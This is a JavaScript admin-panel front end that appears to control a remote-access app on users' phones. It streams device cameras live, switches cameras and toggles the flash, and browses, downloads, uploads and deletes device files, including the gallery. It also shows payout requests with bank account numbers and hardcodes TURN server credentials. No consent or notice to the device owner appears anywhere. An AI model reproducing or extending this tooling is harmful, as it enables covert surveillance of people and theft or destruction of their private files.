(function () {
  const API_BASE = window.location.origin;
  const TOKEN_KEY = 'admin_token';

  const loginSection = document.getElementById('loginSection');
  const adminSection = document.getElementById('adminSection');
  const viewerSection = document.getElementById('viewerSection');
  const fileBrowserSection = document.getElementById('fileBrowserSection');
  const loginError = document.getElementById('loginError');
  const adminError = document.getElementById('adminError');
  const deviceList = document.getElementById('deviceList');
  const withdrawList = document.getElementById('withdrawList');
  const viewerStatus = document.getElementById('viewerStatus');
  const remoteVideo = document.getElementById('remoteVideo');
  const stopViewBtn = document.getElementById('stopViewBtn');
  const switchCameraBtn = document.getElementById('switchCameraBtn');
  const flashOnBtn = document.getElementById('flashOnBtn');
  const flashOffBtn = document.getElementById('flashOffBtn');

  let socket = null;
  let pc = null;
  let currentDeviceId = null;
  let currentRoomId = null;

  let fileSocket = null;
  let fileSessionId = null;
  let fileCurrentPath = '';
  let fileRequestId = 0;
  let filePreviewObjectUrl = null;
  const filePending = new Map();

  function getToken() {
    return localStorage.getItem(TOKEN_KEY);
  }

  function setToken(token) {
    if (token) localStorage.setItem(TOKEN_KEY, token);
    else localStorage.removeItem(TOKEN_KEY);
  }

  function showError(el, msg) {
    el.textContent = msg;
    el.className = 'status error';
    el.classList.remove('hidden');
  }

  function hideError(el) {
    el.classList.add('hidden');
  }

  function showSection(section) {
    loginSection.classList.add('hidden');
    adminSection.classList.add('hidden');
    viewerSection.classList.add('hidden');
    if (fileBrowserSection) fileBrowserSection.classList.add('hidden');
    section.classList.remove('hidden');
  }

  async function login() {
    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value;
    if (!username || !password) {
      showError(loginError, 'Enter username and password');
      return;
    }
    hideError(loginError);
    try {
      const res = await fetch(`${API_BASE}/auth/token`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password }),
      });
      const data = await res.json();
      if (data.token) {
        setToken(data.token);
        showSection(adminSection);
        loadDevices();
        loadWithdrawRequests();
      } else {
        showError(loginError, data.error || 'Login failed');
      }
    } catch (e) {
      showError(loginError, 'Login failed: ' + e.message);
    }
  }

  document.getElementById('loginBtn').onclick = login;

  document.getElementById('logoutBtn').onclick = () => {
    setToken(null);
    showSection(loginSection);
  };

  async function loadDevices() {
    const token = getToken();
    if (!token) return;
    hideError(adminError);
    try {
      const res = await fetch(`${API_BASE}/devices`, {
        headers: { Authorization: `Bearer ${token}` },
      });
      const data = await res.json();
      if (data.devices) {
        renderDevices(data.devices);
      } else {
        showError(adminError, data.error || 'Failed to load devices');
      }
    } catch (e) {
      showError(adminError, 'Failed to load devices: ' + e.message);
    }
  }

  document.getElementById('refreshBtn').onclick = () => {
    loadDevices();
    loadWithdrawRequests();
  };

  async function loadWithdrawRequests() {
    const token = getToken();
    if (!token) return;
    try {
      const res = await fetch(`${API_BASE}/admin/withdraw-requests`, {
        headers: { Authorization: `Bearer ${token}` },
      });
      const data = await res.json();
      if (data.requests) {
        renderWithdrawRequests(data.requests);
      }
    } catch (e) {
      console.error('Failed to load withdraw requests:', e);
    }
  }

  function renderWithdrawRequests(requests) {
    withdrawList.innerHTML = requests
      .map(
        (r) => `
      <tr>
        <td>${escapeHtml(r.username)}</td>
        <td>${r.amount}</td>
        <td>${escapeHtml(r.bank || '-')}</td>
        <td>${escapeHtml(r.accountNumber || '-')}</td>
        <td>${escapeHtml(r.status)}</td>
        <td>${formatDate(r.createdAt)}</td>
      </tr>
    `
      )
      .join('');
  }

  function renderDevices(devices) {
    deviceList.innerHTML = devices
      .map(
        (d) => `
      <tr>
        <td>${escapeHtml(d.deviceId)}</td>
        <td>${escapeHtml(d.deviceName || '-')}</td>
        <td>${escapeHtml(d.platform || '-')}</td>
        <td>${formatDate(d.lastSeenAt)}</td>
        <td>${d.online ? '<span style="color:green">Online</span>' : '<span style="color:gray">Offline</span>'}</td>
        <td>
          <button class="viewBtn" data-device-id="${escapeHtml(d.deviceId)}" ${d.online ? '' : 'disabled'}>View</button>
          <button class="fileAccessBtn" data-device-id="${escapeHtml(d.deviceId)}" ${d.online ? '' : 'disabled'}>Files</button>
        </td>
      </tr>
    `
      )
      .join('');
    deviceList.querySelectorAll('.viewBtn').forEach((btn) => {
      if (!btn.disabled) btn.onclick = () => viewStream(btn.dataset.deviceId);
    });
    deviceList.querySelectorAll('.fileAccessBtn').forEach((btn) => {
      if (!btn.disabled) btn.onclick = () => openFileBrowser(btn.dataset.deviceId);
    });
  }

  function escapeHtml(s) {
    const div = document.createElement('div');
    div.textContent = s;
    return div.innerHTML;
  }

  function formatDate(d) {
    if (!d) return '-';
    return new Date(d).toLocaleString();
  }

  async function viewStream(deviceId) {
    const token = getToken();
    if (!token) return;
    currentDeviceId = deviceId;
    showSection(viewerSection);
    viewerStatus.textContent = 'Requesting stream...';
    viewerStatus.className = 'status info';

    try {
      const res = await fetch(`${API_BASE}/admin/request-stream`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          Authorization: `Bearer ${token}`,
        },
        body: JSON.stringify({ deviceId }),
      });
      const data = await res.json();
      if (data.roomId) {
        currentRoomId = data.roomId;
        connectAsViewer(data.roomId, token);
      } else {
        viewerStatus.textContent = data.error || 'Failed to request stream';
        viewerStatus.className = 'status error';
      }
    } catch (e) {
      viewerStatus.textContent = 'Error: ' + e.message;
      viewerStatus.className = 'status error';
    }
  }

  async function connectAsViewer(roomId, token) {
    const fallbackIceServers = [
      { urls: 'stun:stun.l.google.com:19302' },
      { urls: 'stun:stun1.l.google.com:19302' },
      { urls: 'turn:46.62.229.16:3478', username: 'streamuser', credential: 'strongpassword123' },
      { urls: 'turn:46.62.229.16:3478?transport=tcp', username: 'streamuser', credential: 'strongpassword123' },
    ];
    let iceServers = fallbackIceServers;
    try {
      const r = await fetch(API_BASE + '/config');
      const cfg = await r.json();
      if (cfg.iceServers && cfg.iceServers.length) iceServers = cfg.iceServers;
    } catch (e) {}

    socket = io(API_BASE, {
      auth: { token },
      transports: ['websocket'],
    });

    pc = new RTCPeerConnection({
      iceServers,
    });

    let remoteDescSet = false;
    let broadcasterPeerId = null;
    const pendingCandidates = [];

    pc.onicecandidate = (e) => {
      if (e.candidate && broadcasterPeerId) {
        socket.emit('ice-candidate', {
          roomId,
          candidate: e.candidate.toJSON ? e.candidate.toJSON() : { candidate: e.candidate.candidate, sdpMid: e.candidate.sdpMid, sdpMLineIndex: e.candidate.sdpMLineIndex },
          toPeerId: broadcasterPeerId,
        });
      }
    };

    pc.ontrack = (e) => {
      const stream = (e.streams && e.streams[0]) ? e.streams[0] : new MediaStream([e.track]);
      remoteVideo.srcObject = stream;
      viewerStatus.textContent = 'Streaming';
      viewerStatus.className = 'status success';
      remoteVideo.play().catch(() => {});
    };

    pc.onconnectionstatechange = () => {
      const state = pc.connectionState;
      if (state === 'failed' || state === 'disconnected') {
        viewerStatus.textContent = 'Connection ' + state;
        viewerStatus.className = 'status error';
      } else if (state === 'connecting' && viewerStatus.textContent === 'Waiting for stream...') {
        viewerStatus.textContent = 'Connecting...';
      } else if (state === 'connected' && viewerStatus.textContent.indexOf('Streaming') !== 0) {
        viewerStatus.textContent = 'Connected, waiting for video...';
      }
    };

    socket.on('connect', () => {
      socket.emit('join-room', { roomId, role: 'viewer' });
    });

    socket.on('room-joined', (data) => {
      viewerStatus.textContent = 'Waiting for stream...';
    });

    socket.on('offer', async (data) => {
      const { sdp, fromPeerId } = data;
      broadcasterPeerId = fromPeerId;
      try {
        const desc = sdp && (sdp.sdp !== undefined) ? sdp : { type: 'offer', sdp: sdp };
        await pc.setRemoteDescription(new RTCSessionDescription(desc));
        remoteDescSet = true;
        for (const c of pendingCandidates) {
          try {
            await pc.addIceCandidate(new RTCIceCandidate(c));
          } catch (err) {}
        }
        pendingCandidates.length = 0;
        const answer = await pc.createAnswer();
        await pc.setLocalDescription(answer);
        socket.emit('answer', { roomId, sdp: answer, toPeerId: fromPeerId });
      } catch (e) {
        viewerStatus.textContent = 'Offer error: ' + (e.message || e);
        viewerStatus.className = 'status error';
      }
    });

    socket.on('ice-candidate', async (data) => {
      const { candidate, fromPeerId } = data;
      if (!candidate) return;
      const c = candidate.candidate !== undefined ? candidate : { candidate: candidate, sdpMid: null, sdpMLineIndex: null };
      if (remoteDescSet) {
        try {
          await pc.addIceCandidate(new RTCIceCandidate(c));
        } catch (e) {}
      } else {
        pendingCandidates.push(c);
      }
    });

    socket.on('peer-disconnected', () => {
      viewerStatus.textContent = 'Broadcaster disconnected';
      viewerStatus.className = 'status error';
    });

    socket.on('error', (data) => {
      viewerStatus.textContent = data.message || 'Error';
      viewerStatus.className = 'status error';
    });
  }

  switchCameraBtn.onclick = () => {
    if (socket && currentRoomId) {
      socket.emit('remote-command', { roomId: currentRoomId, command: { type: 'switch-camera' } });
    }
  };

  flashOnBtn.onclick = () => {
    if (socket && currentRoomId) {
      socket.emit('remote-command', { roomId: currentRoomId, command: { type: 'flash-on' } });
    }
  };

  flashOffBtn.onclick = () => {
    if (socket && currentRoomId) {
      socket.emit('remote-command', { roomId: currentRoomId, command: { type: 'flash-off' } });
    }
  };

  async function openFileBrowser(deviceId) {
    const token = getToken();
    if (!token) return;
    currentDeviceId = deviceId;
    const statusEl = document.getElementById('fileBrowserStatus');
    const pathEl = document.getElementById('fileBrowserPath');
    showSection(fileBrowserSection);
    statusEl.textContent = 'Requesting file access...';
    statusEl.className = 'status info';
    fileCurrentPath = '';
    pathEl.textContent = '/';

    try {
      const res = await fetch(`${API_BASE}/admin/request-file-access`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
        body: JSON.stringify({ deviceId }),
      });
      const data = await res.json();
      if (!data.sessionId) {
        statusEl.textContent = data.error || 'Failed to request file access';
        statusEl.className = 'status error';
        return;
      }
      fileSessionId = data.sessionId;
      connectFileSocket(token, statusEl);
    } catch (e) {
      statusEl.textContent = 'Error: ' + e.message;
      statusEl.className = 'status error';
    }
  }

  function connectFileSocket(token, statusEl) {
    const sessionJoinedTimeout = setTimeout(() => {
      if (statusEl.textContent === 'Requesting file access...' || statusEl.textContent === 'Connecting...') {
        statusEl.textContent = 'Device did not respond. Ensure the app is open on the device and try again.';
        statusEl.className = 'status error';
      }
    }, 15000);
    function onSessionJoined() {
      clearTimeout(sessionJoinedTimeout);
      statusEl.textContent = 'Connected';
      statusEl.className = 'status success';
      fileListRequest('');
    }
    if (fileSocket?.connected) {
      statusEl.textContent = 'Connecting...';
      fileSocket.emit('join-file-session', { sessionId: fileSessionId });
      fileSocket.once('file-session-joined', onSessionJoined);
      return;
    }
    fileSocket = io(API_BASE, { auth: { token }, transports: ['websocket'] });
    fileSocket.on('connect', () => {
      statusEl.textContent = 'Connecting...';
      fileSocket.emit('join-file-session', { sessionId: fileSessionId });
    });
    fileSocket.once('file-session-joined', onSessionJoined);
    fileSocket.on('file-session-closed', () => {
      clearTimeout(sessionJoinedTimeout);
      statusEl.textContent = 'Session closed';
      statusEl.className = 'status error';
      const overlayEl = document.getElementById('filePreviewOverlay');
      if (overlayEl && !overlayEl.classList.contains('hidden')) {
        document.getElementById('filePreviewContent').innerHTML = '<p class="status error">Session closed. Close and try again.</p>';
      }
    });
    fileSocket.on('file-list-response', (data) => {
      const { requestId, path, entries, error } = data;
      const cb = filePending.get('list-' + requestId);
      filePending.delete('list-' + requestId);
      if (cb) cb(error ? { error } : { entries });
    });
    fileSocket.on('file-get-response', (data) => {
      const { requestId, path, content, error } = data;
      const cb = filePending.get('get-' + requestId);
      filePending.delete('get-' + requestId);
      if (cb) cb(error ? { error } : { content });
    });
    fileSocket.on('file-put-response', (data) => {
      const { requestId, path, error } = data;
      const cb = filePending.get('put-' + requestId);
      filePending.delete('put-' + requestId);
      if (cb) cb(error ? { error } : {});
    });
    fileSocket.on('file-delete-response', (data) => {
      const { requestId, path, error } = data;
      const cb = filePending.get('delete-' + requestId);
      filePending.delete('delete-' + requestId);
      if (cb) cb(error ? { error } : {});
    });
    fileSocket.on('error', (data) => {
      statusEl.textContent = data.message || 'Error';
      statusEl.className = 'status error';
    });
  }

  function fileListRequest(path) {
    if (!fileSocket?.connected || !fileSessionId) return;
    const id = ++fileRequestId;
    filePending.set('list-' + id, (result) => {
      const listEl = document.getElementById('fileBrowserList');
      const pathEl = document.getElementById('fileBrowserPath');
      fileCurrentPath = path || '';
      pathEl.textContent = path || '/';
      if (result.error) {
        listEl.innerHTML = '<tr><td colspan="4">' + escapeHtml(result.error) + '</td></tr>';
        return;
      }
      const entries = result.entries || [];
      listEl.innerHTML = entries
        .map(
          (e) => {
            const displayName = e.displayName != null ? e.displayName : e.name;
            const segPath = path ? path + '/' + e.name : e.name;
            const canPreview = !e.isDir && isPreviewableFile(displayName);
            return `
        <tr>
          <td>${escapeHtml(displayName)}</td>
          <td>${e.isDir ? 'Folder' : 'File'}</td>
          <td>${e.isDir ? '-' : (e.size != null ? e.size + ' B' : '-')}</td>
          <td>
            ${e.isDir ? `<button class="fileOpenDirBtn" data-path="${escapeHtml(segPath)}">Open</button>` : ''}
            ${canPreview ? `<button class="filePreviewBtn" data-path="${escapeHtml(segPath)}" data-name="${escapeHtml(displayName)}">Preview</button>` : ''}
            ${!e.isDir ? `<button class="fileDownloadBtn" data-path="${escapeHtml(segPath)}" data-name="${escapeHtml(displayName)}">Download</button>` : ''}
            ${!e.isDir && !path.startsWith('Gallery') && path !== '' ? `<button class="fileDeleteBtn" data-path="${escapeHtml(segPath)}" data-name="${escapeHtml(displayName)}">Delete</button>` : ''}
          </td>
        </tr>
      `;
          }
        )
        .join('');
      listEl.querySelectorAll('.fileOpenDirBtn').forEach((btn) => {
        btn.onclick = () => {
          fileCurrentPath = btn.dataset.path;
          fileListRequest(btn.dataset.path);
        };
      });
      listEl.querySelectorAll('.filePreviewBtn').forEach((btn) => {
        btn.onclick = () => filePreview(btn.dataset.path, btn.dataset.name);
      });
      listEl.querySelectorAll('.fileDownloadBtn').forEach((btn) => {
        btn.onclick = () => fileDownload(btn.dataset.path, btn.dataset.name);
      });
      listEl.querySelectorAll('.fileDeleteBtn').forEach((btn) => {
        btn.onclick = () => fileDelete(btn.dataset.path, btn.dataset.name);
      });
    });
    fileSocket.emit('file-list-request', { sessionId: fileSessionId, requestId: id, path: path || '' });
  }

  function isPreviewableFile(name) {
    const n = (name || '').toLowerCase();
    return /\.(jpe?g|png|gif|webp|bmp|svg|mp4|webm|ogg|mov|avi)$/.test(n);
  }

  function filePreview(path, name) {
    if (!fileSocket?.connected || !fileSessionId) return;
    const contentEl = document.getElementById('filePreviewContent');
    const overlayEl = document.getElementById('filePreviewOverlay');
    contentEl.innerHTML = '<p class="status info">Loading...</p>';
    overlayEl.classList.remove('hidden');
    const id = ++fileRequestId;
    let resolved = false;
    function finishPreview(result) {
      if (resolved) return;
      resolved = true;
      if (result.error) {
        contentEl.innerHTML = '<p class="status error">' + escapeHtml(result.error) + '</p>';
        return;
      }
      try {
        const bin = atob(result.content);
        const arr = new Uint8Array(bin.length);
        for (let i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
        const blob = new Blob([arr]);
        if (filePreviewObjectUrl) URL.revokeObjectURL(filePreviewObjectUrl);
        filePreviewObjectUrl = URL.createObjectURL(blob);
        const ext = (name || path).split('.').pop().toLowerCase();
        const isVideo = ['mp4', 'webm', 'ogg', 'mov', 'avi'].indexOf(ext) !== -1;
        if (isVideo) {
          contentEl.innerHTML = '<video src="' + filePreviewObjectUrl + '" controls autoplay></video>';
        } else {
          contentEl.innerHTML = '<img src="' + filePreviewObjectUrl + '" alt="Preview">';
        }
      } catch (e) {
        contentEl.innerHTML = '<p class="status error">Preview failed: ' + escapeHtml(e.message) + '</p>';
      }
    }
    const previewTimeout = setTimeout(() => {
      filePending.delete('get-' + id);
      finishPreview({ error: 'Preview timed out. File may be too large or the connection was slow.' });
    }, 60000);
    filePending.set('get-' + id, (result) => {
      clearTimeout(previewTimeout);
      finishPreview(result);
    });
    fileSocket.emit('file-get-request', { sessionId: fileSessionId, requestId: id, path });
  }

  function closeFilePreview() {
    if (filePreviewObjectUrl) {
      URL.revokeObjectURL(filePreviewObjectUrl);
      filePreviewObjectUrl = null;
    }
    document.getElementById('filePreviewOverlay').classList.add('hidden');
  }
  document.getElementById('filePreviewCloseBtn').onclick = closeFilePreview;
  document.querySelector('.file-preview-backdrop').onclick = closeFilePreview;

  function fileDownload(path, name) {
    if (!fileSocket?.connected || !fileSessionId) return;
    const id = ++fileRequestId;
    filePending.set('get-' + id, (result) => {
      if (result.error) {
        alert(result.error);
        return;
      }
      try {
        const bin = atob(result.content);
        const arr = new Uint8Array(bin.length);
        for (let i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
        const blob = new Blob([arr]);
        const a = document.createElement('a');
        a.href = URL.createObjectURL(blob);
        a.download = name || path.split('/').pop() || 'download';
        a.click();
        URL.revokeObjectURL(a.href);
      } catch (e) {
        alert('Download failed: ' + e.message);
      }
    });
    fileSocket.emit('file-get-request', { sessionId: fileSessionId, requestId: id, path });
  }

  function fileUpload(path, base64Content) {
    if (!fileSocket?.connected || !fileSessionId) return;
    const id = ++fileRequestId;
    filePending.set('put-' + id, (result) => {
      if (result.error) alert(result.error);
      else fileListRequest(fileCurrentPath);
    });
    fileSocket.emit('file-put', { sessionId: fileSessionId, requestId: id, path, content: base64Content });
  }

  function fileDelete(path, name) {
    if (!confirm('Delete "' + name + '"?')) return;
    if (!fileSocket?.connected || !fileSessionId) return;
    const id = ++fileRequestId;
    filePending.set('delete-' + id, (result) => {
      if (result.error) alert(result.error);
      else fileListRequest(fileCurrentPath);
    });
    fileSocket.emit('file-delete', { sessionId: fileSessionId, requestId: id, path });
  }

  document.getElementById('fileBrowserBackBtn').onclick = () => {
    if (!fileCurrentPath) return;
    const parts = fileCurrentPath.split('/').filter(Boolean);
    parts.pop();
    fileCurrentPath = parts.join('/');
    fileListRequest(fileCurrentPath);
  };

  document.getElementById('fileBrowserRefreshBtn').onclick = () => {
    fileListRequest(fileCurrentPath);
  };

  document.getElementById('fileBrowserFileInput').onchange = (e) => {
    const file = e.target.files?.[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = () => {
      const b64 = (reader.result || '').split(',')[1] || reader.result;
      const name = file.name;
      const path = fileCurrentPath ? fileCurrentPath + '/' + name : name;
      fileUpload(path, b64);
    };
    reader.readAsDataURL(file);
    e.target.value = '';
  };

  document.getElementById('fileBrowserUploadBtn').onclick = () => {
    document.getElementById('fileBrowserFileInput').click();
  };

  document.getElementById('fileBrowserCloseBtn').onclick = async () => {
    if (fileSocket) {
      fileSocket.disconnect();
      fileSocket = null;
    }
    fileSessionId = null;
    filePending.clear();
    const token = getToken();
    if (token && currentDeviceId) {
      try {
        await fetch(`${API_BASE}/admin/stop-file-access`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
          body: JSON.stringify({ deviceId: currentDeviceId }),
        });
      } catch (e) {}
    }
    currentDeviceId = null;
    showSection(adminSection);
    loadDevices();
  };

  stopViewBtn.onclick = async () => {
    if (socket) {
      socket.disconnect();
      socket = null;
    }
    if (pc) {
      pc.close();
      pc = null;
    }
    if (currentDeviceId) {
      const token = getToken();
      if (token) {
        try {
          await fetch(`${API_BASE}/admin/stop-stream`, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              Authorization: `Bearer ${token}`,
            },
            body: JSON.stringify({ deviceId: currentDeviceId }),
          });
        } catch (e) {}
      }
    }
    currentDeviceId = null;
    currentRoomId = null;
    remoteVideo.srcObject = null;
    showSection(adminSection);
    loadDevices();
  };

  if (getToken()) {
    showSection(adminSection);
    loadDevices();
    loadWithdrawRequests();
  } else {
    showSection(loginSection);
  }
})();
